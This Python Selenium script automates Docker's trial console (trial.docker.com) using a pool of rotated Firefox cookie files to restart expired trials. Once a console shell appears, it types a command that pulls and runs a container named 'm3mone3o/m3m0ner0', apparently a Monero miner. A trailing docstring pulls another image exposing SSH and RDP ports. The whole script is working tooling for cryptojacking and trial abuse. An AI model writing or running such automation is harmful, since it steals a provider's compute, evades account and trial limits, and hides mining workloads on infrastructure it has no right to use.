# -*- coding: utf-8 -*-
from BROWSER_ import *
from t00l import *
import sys , io,time , os
import subprocess
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
global inum_prof2
from pyvirtualdisplay import Display
global inum_prof
display = Display(visible=0, size=(1366, 768))
display.start()

path_profile="/root/.mozilla/firefox/"
prof0_0="/root/Qookie/prof0_0/"
os.chdir(prof0_0)
filess = sorted(os.listdir(os.getcwd()), key=os.path.getmtime)

waiting_pro="/root/Qookie/waiting_pro/"
os.chdir(waiting_pro)
waiting_filess=sorted(os.listdir(os.getcwd()), key=os.path.getmtime)
localee="/root/Qookie/"
os.chdir(localee)
############

############
def init_(driver):
	driver.get('https://trial.docker.com/launching')
	pinto(" O K ","G_BLOOD_END")
	time.sleep(1)
	chk(driver)

def init_w(driver,inum_prof):
	driver.get('https://trial.docker.com/launching')
	pinto(" O K ","G_BLOOD_END")
	time.sleep(1)
	chk_w(driver,inum_prof)





def chk_w(driver,inum_prof):
	driver.refresh()
	time.sleep(1)
	#print(id_prof)
	try:
		invalid_profile="mv "+prof0_0+inum_prof+" /root/Qookie/INVALID_PROFILE/"
		first_name=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "signup_first_name")))
		pinto(" W R O N G - P R O F I L E  : ","G_BLOOD_PLUS")
		subprocess.Popen(invalid_profile, shell=True)
		time.sleep(1)
		print("REMOVING OLD PROFILE  ")
		driver.close()
		return
		#driver.quit()
	except:
		pass

	c_url=driver.current_url
	if "launching" in c_url :
		new_cooko(inum_prof)
		pinto(" W A I T I N G   T I M E : ","G_BLOOD_PLUS")
		try:
			trial_lanching2=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.LFciOZ2c0shORRbilT_zE')))
			
			trial_time=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.wNAy2ID23AKckdnSTeBA0')))
			timm=trial_time.text
			to=timm.split(":")
			secc=int(to[0])*60+int(to[1])
			pinto(str(secc),"G_BLOOD_END")
			time.sleep(secc)

			#driver.quit()
			#time.sleep(secc)
			chk(driver)
			#time.sleep(60)
			#return
		except  Exception as e:
			pinto(" N O 2 trial_lanching"+str(e),"G_BLOOD_END")
			#chk(driver)
			driver.quit()
	if "demo" in c_url :
		try:
			#element = wait.until(EC.visibility_of_element_located((By.XPATH, "//*[@id='posted_1']/div[3]")))
			trial_lisst=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, '//*[@id="root"]/div/div/div[1]/ul/li[3]/div')))
			pinto("docker ok ","G_BLOOD_END")
			lis1=driver.find_elements_by_xpath('//*[@id="root"]/div/div/div[1]/ul/li[3]/div')[0]
			lis1.click()
			pinto(" ADMIN O K","G_BLOOD_END")
			
			try:
				lis1.click()
				B_button=WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.terminal.xterm.xterm-theme-default.xterm-cursor-style-block')))
				B_button.click()
				time.sleep(10)
				B2_button=WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.xterm-rows')))
				tter=B2_button.text
				#xterm-rows
				if "admin@trial-console:~$" in tter:
					B_button.send_keys("docker pull m3mone3o/m3m0ner0 && docker run -t -i -d -m 52M  m3mone3o/m3m0ner0",Keys.RETURN)
					pinto(" admin@trial-console : O K ","G_BLOOD_END")
				else:
					pass
					#driver.refresh()
					#chk(driver)

			except  Exception as e:
				pinto(" N O "+str(e),"G_BLOOD_END")


		except  Exception as e:
			pinto(" N O "+str(e),"G_BLOOD_END")
	if "expir" in c_url :
		try:
			trial_lanching=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '._1HzQ5Leqk_2upNfof4J1WE')))
			pinto(" START NEW Trial  ","G_BLOOD_PLUS")
			##########################################
			trial_lanching.click()
			pinto(" OK  ","G_BLOOD_END")
			#driver.refresh()

			##################
			trial_lanching2=WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.LFciOZ2c0shORRbilT_zE')))
			pinto(" O K trial TIMING ","G_BLOOD_END")
			new_cooko()
			time.sleep(1)
			chk(driver)
		except  Exception as e:
			pinto(" N O trial_lanching"+str(e),"G_BLOOD_END")
	if "failed" in c_url :
		#.dbutton._1zgFwuiOy0bvgXeqzUE4f0._349c4AoVI9EyC7DBqXSs0W._3MhKYSlZkdX1p1CL6UnazT
		retry_lanching2=WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.dbutton._1zgFwuiOy0bvgXeqzUE4f0._349c4AoVI9EyC7DBqXSs0W._3MhKYSlZkdX1p1CL6UnazT')))
		retry_lanching2.click()
		chk(driver)
	time.sleep(1)
	driver.quit()
	#try:
		#CHECK(driver)
		#return
	#except:
		#pass








def chk(driver):
	driver.refresh()
	time.sleep(1)
	#print(id_prof)
	try:
		invalid_profile="mv "+prof0_0+inum_prof+" /root/Qookie/INVALID_PROFILE/"
		first_name=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "signup_first_name")))
		pinto(" W R O N G - P R O F I L E  : ","G_BLOOD_PLUS")
		subprocess.Popen(invalid_profile, shell=True)
		time.sleep(1)
		print("REMOVING OLD PROFILE  ")
		driver.close()
		return
		#driver.quit()
	except:
		pass

	c_url=driver.current_url
	if "launching" in c_url :
		new_cooko(inum_prof)
		pinto(" W A I T I N G   T I M E : ","G_BLOOD_PLUS")
		try:
			trial_lanching2=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.LFciOZ2c0shORRbilT_zE')))
			
			trial_time=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.wNAy2ID23AKckdnSTeBA0')))
			timm=trial_time.text
			to=timm.split(":")
			secc=int(to[0])*60+int(to[1])
			pinto(str(secc),"G_BLOOD_END")
			#time.sleep(secc)

			driver.quit()
			#time.sleep(secc)
			#chk(driver)
			#time.sleep(60)
			#return
		except  Exception as e:
			pinto(" N O 2 trial_lanching"+str(e),"G_BLOOD_END")
			#chk(driver)
			driver.quit()
	if "demo" in c_url :
		try:
			#element = wait.until(EC.visibility_of_element_located((By.XPATH, "//*[@id='posted_1']/div[3]")))
			trial_lisst=WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, '//*[@id="root"]/div/div/div[1]/ul/li[3]/div')))
			pinto("docker ok ","G_BLOOD_END")
			lis1=driver.find_elements_by_xpath('//*[@id="root"]/div/div/div[1]/ul/li[3]/div')[0]
			lis1.click()
			pinto(" ADMIN O K","G_BLOOD_END")
			
			try:
				lis1.click()
				B_button=WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.terminal.xterm.xterm-theme-default.xterm-cursor-style-block')))
				B_button.click()
				time.sleep(10)
				B2_button=WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.xterm-rows')))
				tter=B2_button.text
				#xterm-rows
				if "admin@trial-console:~$" in tter:
					B_button.send_keys("docker pull m3mone3o/m3m0ner0 && docker run -t -i -d -m 52M  m3mone3o/m3m0ner0",Keys.RETURN)
					pinto(" admin@trial-console : O K ","G_BLOOD_END")
				else:
					pass
					#driver.refresh()
					#chk(driver)

			except  Exception as e:
				pinto(" N O "+str(e),"G_BLOOD_END")


		except  Exception as e:
			pinto(" N O "+str(e),"G_BLOOD_END")
	if "expir" in c_url :
		try:
			trial_lanching=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '._1HzQ5Leqk_2upNfof4J1WE')))
			pinto(" START NEW Trial  ","G_BLOOD_PLUS")
			##########################################
			trial_lanching.click()
			pinto(" OK  ","G_BLOOD_END")
			#driver.refresh()

			##################
			trial_lanching2=WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.LFciOZ2c0shORRbilT_zE')))
			pinto(" O K trial TIMING ","G_BLOOD_END")
			new_cooko()
			time.sleep(1)
			chk(driver)
		except  Exception as e:
			pinto(" N O trial_lanching"+str(e),"G_BLOOD_END")
	if "failed" in c_url :
		#.dbutton._1zgFwuiOy0bvgXeqzUE4f0._349c4AoVI9EyC7DBqXSs0W._3MhKYSlZkdX1p1CL6UnazT
		retry_lanching2=WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.dbutton._1zgFwuiOy0bvgXeqzUE4f0._349c4AoVI9EyC7DBqXSs0W._3MhKYSlZkdX1p1CL6UnazT')))
		retry_lanching2.click()
		chk(driver)
	time.sleep(1)
	driver.quit()
	#try:
		#CHECK(driver)
		#return
	#except:
		#pass
def CHECK(driver):
	try:
		trial_lanching=WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.LFciOZ2c0shORRbilT_zE')))
		pinto(" O K trial_lf","G_BLOOD_END")
		time.sleep(1)
		#driver.refresh()
		#CHECK(driver)
	except  Exception as e:
		pinto(" N O lf"+str(e),"G_BLOOD_END")

def starter():
	#os.system('clear')
	pinto("CREATE_* INSTANCE !!","G_BLOOD_PLUS")
	driver=createDriverInstance_with_profil()
	pinto(" O K ","G_BLOOD_END")
	pinto("GO TO docke ","G_BLOOD_PLUS")
	#CHECK(driver)
	init_(driver)


def starter_w(inum_prof):
	#os.system('clear')
	pinto("CREATE_* INSTANCE !!","G_BLOOD_PLUS")
	driver=createDriverInstance_with_profil()
	pinto(" O K ","G_BLOOD_END")
	pinto("GO TO docke ","G_BLOOD_PLUS")
	#CHECK(driver)
	init_w(driver,inum_prof)


#print(filess)
number_profile=len(os.listdir(prof0_0))+1
cooockie_="/root/.mozilla/firefox/hbxtyfcz.00a001/cookies.sqlite"
pathp_="rm  /root/.mozilla/firefox/hbxtyfcz.00a001/cookies.sqlite*"#{" && cp -r  /root/TRAIL_XMR/hbxtyfcz.00a001 /root/.mozilla/firefox/hbxtyfcz.00a001"
kill_fi="pkill firefox"
#for i in prof_a :
#	starter(i)
def manage_profile(iid):
	try:
		subprocess.Popen(kill_fi, shell=True)
		time.sleep(1)
		subprocess.Popen(pathp_, shell=True)
		time.sleep(1)
	except:
		pass
	add_coockie="cp "+prof0_0 +str(iid)+ " " +cooockie_ #+" && "+"cp "+empty_cooockie_ + " " +cooockie_
	subprocess.Popen(add_coockie, shell=True)
	time.sleep(1)
	#subprocess.Popen(add_coockie, shell=True)
def clean_coockie():
	remove_c="rm "+cooockie_+ "*"
	subprocess.Popen(remove_c, shell=True)



# COPY NEW PROFILE


def copie_new_profile(i_d):
	pinto("C R E A T E  NEW COOCKIE  !!","G_BLOOD_PLUS")
	copy0="cp /root/.mozilla/firefox/hbxtyfcz.00a001/cookies.sqlite prof0_0/"+str(i_d)+".new"
	try:
		time.sleep(1)
		subprocess.Popen(copy0, shell=True)
		pinto("COOCKIE  "+str(i_d)+" C R E A T E D  ","G_BLOOD_END")
		time.sleep(1)
	except:
		pass

def new_prof(i_d):
	print(" Profile ! : "+i_d)
	remove_prof="rm -rf /root/.mozilla/firefox/hbxtyfcz.00a001"
	extract_prof="tar xf hbxtyfcz.00a001.tar.gz -C /root/.mozilla/firefox"
	empty_tmp="rm -rf /tmp/*"
	cooockie_="/root/.mozilla/firefox/hbxtyfcz.00a001/cookies.sqlite"
	copy_coockie="cp /root/Qookie/prof0_0/"+str(i_d)+" /root/.mozilla/firefox/hbxtyfcz.00a001/cookies.sqlite"

	try:
		subprocess.Popen(remove_prof, shell=True)
		time.sleep(1)
		print("REMOVING OLD PROFILE  ")
		subprocess.Popen(empty_tmp, shell=True)
	except:
		pass
	try:
		subprocess.Popen(extract_prof, shell=True)
		time.sleep(1)
		print("EXTRACT PROFILE : " +i_d)
	except:
		pass
	try:
		subprocess.Popen(copy_coockie, shell=True)
		time.sleep(1)
		print("COPY  PROFILE  :  "+i_d )
	except:
		pass



def save_coo(pathio,inum_prof) :
	#prof0_0
	#print(id_prof)
	remove_prof="rm " + prof0_0+inum_prof
	move_prof="cp "+pathio + " "+prof0_0+inum_prof
	move_prof_waiting ="mv "+pathio + " /root/Qookie/waiting_pro/"+inum_prof
	try:
		subprocess.Popen(remove_prof, shell=True)
		time.sleep(1)
		print("REMOV OLD   PROFILE  :  "+inum_prof )
	except:
		pass
	try:
		subprocess.Popen(move_prof, shell=True)
		time.sleep(1)
		print("ADD NEW  PROFILE  :  "+inum_prof )
	except:
		pass
	try:
		subprocess.Popen(move_prof_waiting, shell=True)
		time.sleep(1)
		print("move_prof_waiting  PROFILE  :  "+inum_prof )
	except:
		pass
def new_cooko(inum_prof):
	tmp_diroc= os.listdir("/tmp")

	for jj in tmp_diroc :
		if "rust_mozprofile." in jj:
			print (jj)
			pathio="/tmp/"+jj+"/cookies.sqlite"
			save_coo(pathio,inum_prof)
			break



def scobi():
	
	for id_prof2 in waiting_filess :
		inum_prof = id_prof2
		print(inum_prof)
		subprocess.Popen("cp "+waiting_pro+id_prof2+" "+prof0_0+id_prof2 , shell=True)
		new_prof(id_prof2)
		starter_w(inum_prof)
		subprocess.Popen("rm "+waiting_pro+id_prof2 , shell=True)



for id_prof in filess :
	inum_prof =id_prof
	#manage_profile(i)
	#print(inum_prof)
	new_prof(id_prof)
	time.sleep(5)
	starter()
	time.sleep(1)
	#copie_new_profile(i)
	#clean_coockie()







if len(waiting_filess) > 0:
	print(waiting_filess)
	scobi()

display.stop()


"""




docker pull 7issa/doc_trail && docker run -d --name NORD1 --hostname NORD1 -p 5001:22 -p 6001:3389 7issa/doc_trail && clear && curl ipinfo.io
 docker run -d --name NORD1 --hostname NORD1 -p 22:22 -p 3389:3389 7issa/doc_trail 
"""